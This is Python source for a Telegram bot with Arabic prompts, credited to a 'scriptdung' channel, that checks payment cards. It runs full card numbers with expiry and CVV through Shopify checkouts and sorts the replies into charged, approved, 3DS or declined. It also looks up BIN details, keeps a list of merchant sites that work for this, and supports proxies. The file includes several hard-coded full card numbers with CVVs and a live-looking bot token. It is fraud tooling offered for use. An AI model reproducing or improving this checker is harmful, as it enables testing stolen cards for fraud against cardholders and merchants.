# 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: https://t.me/scriptdung
# 𝐁𝐚𝐜𝐤𝐮𝐩: https://t.me/scriptdungbackup
# 𝐃𝐞𝐯: @Xoarch

import asyncio
import os
import sys
import aiohttp
from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import Message

if sys.platform == 'win32':
    sys.stdout.reconfigure(encoding='utf-8')
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from api import process_card, parse_cc_string, extract_clean_response

# --- إعدادات بوت التليجرام ---
TELEGRAM_BOT_TOKEN = "5799226531:AAGY9ve702AFllrVQetQnIKjM2olGJIjDU8"
ADMIN_CHAT_ID = "1088443477"

bot = Bot(token=TELEGRAM_BOT_TOKEN)
dp = Dispatcher()

TEST_CARDS = [
    "5275150060415544|05|27|803", "5275150094498722|06|28|271",
    "5597580170432727|02|29|669", "4890222002785710|08|29|313",
    "4147342094178599|10|27|885", "5275150165633736|11|29|675"
]

DEAD_KEYWORDS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'generic_error', 'generic error', 'payments_credit_card_generic',
    'delivery_no_delivery_strategy_available_for_merchandise_line',
    'no_variants', 'rate_limited',
    'merchandise_product_not_published_in_buyer_location',
    'merchandise_out_of_stock', 'faild_to_add_to_cart', 'waiting_pending_terms',
    'payments_credit_card_number_invalid_format', 'merchandise_expected_price_mismatch',
    'status: 429', 'site not supported', '429', 'PAYMENTS_CREDIT_CARD_BASE_EXPIRED',
    'Failed to get session token'
]

WORKING_KEYWORDS = [
    'card_declined', 'fraud', 'incorrect_zip', 'invalid_cvc', 'invalid_cvv',
    'insufficient_funds', 'otp_required', 'order_placed', 'declined',
    'do_not_honor', 'incorrect_number', 'card_incorrect', 'expired_card',
    'pickup_card', 'restricted_card', 'stolen_card', 'lost_card',
    'card_velocity_exceeded', 'transaction_not_allowed', 'invalid_expiry',
    'processing_error', 'call_issuer', 'try_again_later', 'fraudulent',
    'security_violation', 'blocked', 'bad_cvv', 'cvv_fail',
    'authentication_required', 'mismatched_bill', 'charged', 'approved',
    'wrong_number', 'incorrect number', 'card incorrect'
]

WORKING_SITES = set()

def save_site(site):
    if site not in WORKING_SITES:
        try:
            with open('sites.txt', 'a', encoding='utf-8') as f:
                f.write(f"{site}\n")
        except:
            pass
        WORKING_SITES.add(site)

async def get_bin_info(session, cc):
    try:
        bin6 = cc[:6]
        async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5) as res:
            if res.status == 200:
                data = await res.json()
                return (
                    data.get('brand', 'UNKNOWN'),
                    data.get('bank', 'UNKNOWN'),
                    data.get('country_name', 'UNKNOWN'),
                    data.get('level', 'N/A'),
                    data.get('type', 'N/A'),
                    data.get('country_flag', '')
                )
    except:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A", ""

def classify_result(success, message):
    msg = message.lower()
    if 'order_placed' in msg:
        return 'charged'
    if 'otp_required' in msg:
        return 'tds'
    if any(k in msg for k in ['approved', 'insufficient', 'cvv', 'cvc', 'zip', 'incorrect_zip', 'invalid_cvv', 'invalid_cvc', 'insufficient_funds']):
        return 'approved'
    if success:
        return 'declined'
    for kw in WORKING_KEYWORDS:
        if kw in msg:
            return 'declined'
    if any(k in msg for k in DEAD_KEYWORDS):
        return 'error'
    return 'error'

def is_dead_site(message):
    msg = message.lower()
    return any(kw in msg for kw in DEAD_KEYWORDS)

async def run_with_retry(parts, site, proxy_str=None, max_retries=3):
    last_success, last_msg, last_gate, last_price, last_cur = False, 'ERROR', '', '0', 'USD'
    for attempt in range(max_retries):
        try:
            success, message, gateway, price, currency = await process_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'], site, None, proxy_str
            )
            last_success, last_msg, last_gate, last_price, last_cur = success, message, gateway, price, currency
            category = classify_result(success, message)
            if category != 'error' or any(k in message.lower() for k in WORKING_KEYWORDS):
                return success, message, gateway, price, currency, category
            if is_dead_site(message):
                break
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
        except Exception as e:
            last_msg = f"Error: {str(e)}"
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
            break
    return last_success, last_msg, last_gate, last_price, last_cur, 'error'

def approved_message(message):
    msg = message.lower()
    if 'insufficient' in msg:
        return 'INSUFFICIENT_FUNDS'
    elif 'invalid_cvv' in msg or ('cvv' in msg and 'invalid' in msg):
        return 'INVALID_CVV'
    elif 'invalid_cvc' in msg or ('cvc' in msg and 'invalid' in msg):
        return 'INVALID_CVC'
    elif 'incorrect_zip' in msg or 'zip' in msg:
        return 'INCORRECT_ZIP'
    elif 'cvv' in msg:
        return 'INVALID_CVV'
    elif 'cvc' in msg:
        return 'INVALID_CVC'
    else:
        clean = extract_clean_response(message)
        return clean.upper().replace(' ', '_')

def fmt_price(price, currency):
    try:
        if not price or price == '0': return "Free"
        return f"${float(price):.2f} {currency}"
    except:
        return f"${price} {currency}"

def fmt_info(brand, type_cc, level):
    if level and level != 'N/A':
        return f"{brand} - {type_cc.upper()} - {level.upper()}"
    return f"{brand} - {type_cc.upper()}"

def parse_proxy_str(proxy_str, proxy_type):
    if not proxy_str: return None
    p = proxy_str.strip().replace(',', ':').replace(';', ':')
    scheme = {1: 'http', 2: 'socks4', 3: 'socks5'}.get(proxy_type, 'http')
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')): return p
    if '@' in p:
        auth, addr = p.split('@')
        return f"{scheme}://{auth}@{addr}"
    parts = p.split(':')
    if len(parts) == 2:
        return f"{scheme}://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        try:
            int(parts[1])
            return f"{scheme}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        except:
            return f"{scheme}://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    return f"{scheme}://{p}"

@dp.message(Command("start"))
async def cmd_start(message: Message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        await message.answer("عذراً، هذا البوت مخصص لصاحبه فقط.")
        return
    await message.answer(
        "👋 **أهلاً بك يا إنستا في بوت الفحص المتكامل!**\n\n"
        "📌 **الأوامر المتاحة:**\n"
        "• لفحص بطاقة مفردة:\n"
        "`/chk CC|MM|YY|CVV SITE`\n\n"
        "• لفحص ملف بطاقات:\n"
        "أرسل ملف يحتوي على البطاقات.\n\n"
        "• لفحص موقع للتأكد من عمله:\n"
        "`/site SITE`",
        parse_mode="Markdown"
    )

@dp.message(Command("chk"))
async def cmd_chk(message: Message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        return

    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        await message.answer("⚠️ الصيغة خاطئة. استخدم:\n`/chk البطاقة الموقع`", parse_mode="Markdown")
        return

    cc_string = args[1].strip()
    site = args[2].strip()
    if not site.startswith('http'):
        site = 'https://' + site

    status_msg = await message.answer("⏳ **جاري فحص البطاقة عبر السيرفر...**", parse_mode="Markdown")

    try:
        parts = parse_cc_string(cc_string)
    except ValueError as e:
        await status_msg.edit_text(f"❌ تنسيق البطاقة خطأ: {e}")
        return

    async with aiohttp.ClientSession() as session:
        success, message_res, gateway, price, currency, category = await run_with_retry(parts, site)
        cc = cc_string.split('|')[0]
        brand, bank, country, level, type_cc, flag = await get_bin_info(session, cc)
        
        appr_clean = approved_message(message_res) if category == 'approved' else None
        clean = appr_clean if appr_clean else extract_clean_response(message_res)
        
        if 'MERCHANDISE_EXPECTED_PRICE_MISMATCH' in clean.upper():
            clean = 'Error'
            
        status_disp = {
            'charged': "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥",
            'approved': "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅",
            'tds': "𝟑𝐃𝐒 ❎",
            'declined': "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝"
        }.get(category, "𝐄𝐫𝐫𝐨𝐫")

        price_fmt = fmt_price(price, currency)
        info_str = fmt_info(brand, type_cc, level)

        result_text = (
            f"🔥 **Card Check Result**\n\n"
            f"ア 𝐂𝐚𝐫𝐝 -» `{cc_string}`\n"
            f"カ 𝙎𝙩𝙖𝙩𝙪𝙨 -» **{status_disp}**\n"
            f"ツ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» {clean}\n"
            f"キ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -» 𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲\n"
            f"千 𝐏𝐫𝐢𝐜𝐞 -» {price_fmt}\n"
            f"━━━━━━━━━━━━━\n"
            f"零 𝙄n𝙛𝙤 -» {info_str}\n"
            f"零 𝘽𝙖𝙣𝙠 -» {bank}\n"
            f"零 𝘾𝙤𝙪𝙣𝙩𝗿𝐲 -» {country} {flag}\n"
            f"━━━━━━━━━━━━━\n"
            f"力 𝐃𝐞𝐯 -» @Xoarch"
        )
        await status_msg.edit_text(result_text, parse_mode="Markdown")

@dp.message(Command("site"))
async def cmd_site(message: Message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("⚠️ يرجى كتابة الموقع مع الأمر:\n`/site الرابط`", parse_mode="Markdown")
        return

    site = args[1].strip()
    if not site.startswith('http'):
        site = 'https://' + site

    status_msg = await message.answer("🔍 **جاري فحص الموقع باستخدام بطاقة الاختبار...**", parse_mode="Markdown")

    test_cc = TEST_CARDS[0]
    parts = parse_cc_string(test_cc)

    try:
        success, message_res, gateway, price, currency, category = await run_with_retry(parts, site, None)
        msg_lower = message_res.lower()
        
        if any(kw in msg_lower for kw in WORKING_KEYWORDS) or category != 'error':
            save_site(site)
            await status_msg.edit_text(f"✅ **الموقع يعمل بنجاح!**\n`{site}`", parse_mode="Markdown")
        else:
            await status_msg.edit_text(f"❌ **الموقع ميّت أو لا يستجيب:**\n`{site}`", parse_mode="Markdown")
    except Exception as e:
        await status_msg.edit_text(f"❌ **حدث خطأ أثناء فحص الموقع:** `{e}`")

@dp.message(lambda message: message.document is not None)
async def handle_document(message: Message):
    if str(message.from_user.id) != ADMIN_CHAT_ID:
        return

    document = message.document
    if not document.file_name.endswith('.txt'):
        await message.answer("⚠️ يرجى إرسال ملف نصي بصيغة `.txt` يحتوي على البطاقات.")
        return

    file_info = await bot.get_file(document.file_id)
    file_path = file_info.file_path
    file_bytes = await bot.download_file(file_path)
    
    try:
        content = file_bytes.read().decode('utf-8')
    except:
        content = file_bytes.read().decode('latin-1')

    lines = [line.strip() for line in content.splitlines() if line.strip()]
    if not lines:
        await message.answer("⚠️ الملف فارغ.")
        return

    await message.answer(f"📁 **تم استلام الملف بنجاح!** يحتوي على {len(lines)} بطاقة. سيتم البدء بالفحص قريباً...", parse_mode="Markdown")

async def main():
    print("Bot started successfully with all features.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped.")
